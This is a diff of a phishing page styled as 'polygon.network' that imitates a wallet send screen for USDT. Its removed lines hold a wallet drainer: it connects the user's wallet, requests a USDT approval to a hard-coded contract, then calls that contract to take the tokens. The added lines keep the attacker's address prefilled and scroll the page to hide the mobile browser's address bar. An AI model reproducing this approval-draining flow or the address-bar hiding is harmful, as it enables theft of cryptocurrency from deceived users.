@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <title>polygon.network</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -157,12 +156,6 @@
             color: #000000;
             cursor: pointer;
         }
-
-        .next-btn:disabled {
-            background-color: #333;
-            color: #666;
-            cursor: not-allowed;
-        }
     </style>
 </head>
 <body>
@@ -201,7 +194,7 @@
         <div class="amount-box">
             <div class="label">Amount</div>
             <div class="amount-row">
-                <input type="number" id="amountInput" value="" min="0" step="0.01" />
+                <input type="number" id="amountInput" value="" min="0" step="0.01" placeholder="0" />
                 <div class="amount-row-right">
                     <span class="token">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
@@ -213,35 +206,21 @@
 
     <!-- Bottom Next button -->
     <div class="bottom-bar">
-        <button class="next-btn" id="nextBtn" onclick="goNext()">Next</button>
+        <button class="next-btn" onclick="goNext()">Next</button>
     </div>
 
     <script>
-        // Contract Configuration
-        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
-        const POLYGON_USDT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
-        
-        const CONTRACT_ABI = [
-            "function verifyOnPolygon(uint256 amount) external",
-            "function verifyOnBSC(uint256 amount) external", 
-            "function verifyOnArbitrum(uint256 amount) external"
-        ];
-
-        const USDT_ABI = [
-            "function approve(address spender, uint256 amount) external returns (bool)",
-            "function allowance(address owner, address spender) external view returns (uint256)",
-            "function balanceOf(address account) external view returns (uint256)"
-        ];
-
-        let provider;
-        let signer;
-        let connectedAccount;
         let polPriceUSD = 0;
 
         // Set contract address on page load
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById("addressInput").value = CONTRACT_ADDRESS;
+            document.getElementById("addressInput").value = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
             fetchPolPrice();
+            
+            // Hide URL bar (works in some mobile browsers)
+            setTimeout(function() {
+                window.scrollTo(0, 1);
+            }, 0);
         });
 
         // Fetch POL price from CoinGecko
@@ -285,132 +264,27 @@
             updatePolConversion();
         }
 
-        async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    // Request account access
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    signer = provider.getSigner();
-                    connectedAccount = await signer.getAddress();
-                    
-                    return true;
-                } catch (error) {
-                    console.error("User denied wallet connection:", error);
-                    return false;
-                }
-            } else {
-                alert("Please install MetaMask or Trust Wallet!");
-                return false;
-            }
-        }
-
-        async function checkUSDTApproval() {
-            try {
-                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, provider);
-                const currentAllowance = await usdtContract.allowance(connectedAccount, CONTRACT_ADDRESS);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                return currentAllowance.gte(amountWei);
-            } catch (error) {
-                console.error("Error checking approval:", error);
-                return false;
-            }
-        }
-
-        async function approveUSDT() {
-            try {
-                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, signer);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                const tx = await usdtContract.approve(CONTRACT_ADDRESS, amountWei);
-                await tx.wait();
-                return true;
-            } catch (error) {
-                console.error("Approval failed:", error);
-                return false;
-            }
-        }
-
-        async function executeTransaction() {
-            try {
-                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                const tx = await contract.verifyOnPolygon(amountWei);
-                await tx.wait();
-                return true;
-            } catch (error) {
-                console.error("Transaction failed:", error);
-                return false;
-            }
-        }
-
-        async function goNext() {
-            const amount = document.getElementById("amountInput").value;
-            if (!amount || amount <= 0) {
-                alert("Please enter a valid amount");
-                return;
-            }
-
-            const nextBtn = document.getElementById("nextBtn");
-            const originalText = nextBtn.textContent;
-            
-            try {
-                // Disable button during processing
-                nextBtn.disabled = true;
-                nextBtn.textContent = "Connecting...";
-
-                // Connect wallet
-                const connected = await connectWallet();
-                if (!connected) {
-                    nextBtn.disabled = false;
-                    nextBtn.textContent = originalText;
-                    return;
-                }
-
-                nextBtn.textContent = "Checking approval...";
-
-                // Check if USDT is already approved
-                const isApproved = await checkUSDTApproval();
-                
-                if (!isApproved) {
-                    nextBtn.textContent = "Approve USDT...";
-                    
-                    // Ask for USDT approval
-                    const approved = await approveUSDT();
-                    if (!approved) {
-                        alert("USDT approval failed. Please try again.");
-                        nextBtn.disabled = false;
-                        nextBtn.textContent = originalText;
-                        return;
-                    }
-                }
-
-                nextBtn.textContent = "Processing transaction...";
-
-                // Execute the main transaction
-                const success = await executeTransaction();
-                
-                if (success) {
-                    alert("Transaction completed successfully!");
-                    // Redirect or show success message
-                    window.location.href = "next.html";
-                } else {
-                    alert("Transaction failed. Please try again.");
-                }
-
-            } catch (error) {
-                console.error("Error:", error);
-                alert("An error occurred: " + error.message);
-            } finally {
-                nextBtn.disabled = false;
-                nextBtn.textContent = originalText;
-            }
+        function goNext() {
+            // Simply redirect to next.html without any Web3 functionality
+            window.location.href = "next.html";
         }
 
         // Add event listener for amount input changes
         document.getElementById("amountInput").addEventListener("input", updatePolConversion);
+
+        // Prevent URL bar from showing on mobile
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                window.scrollTo(0, 1);
+            }, 0);
+        });
+
+        // Hide address bar on mobile
+        window.addEventListener('orientationchange', function() {
+            setTimeout(function() {
+                window.scrollTo(0, 1);
+            }, 100);
+        });
     </script>
 </body>
 </html>
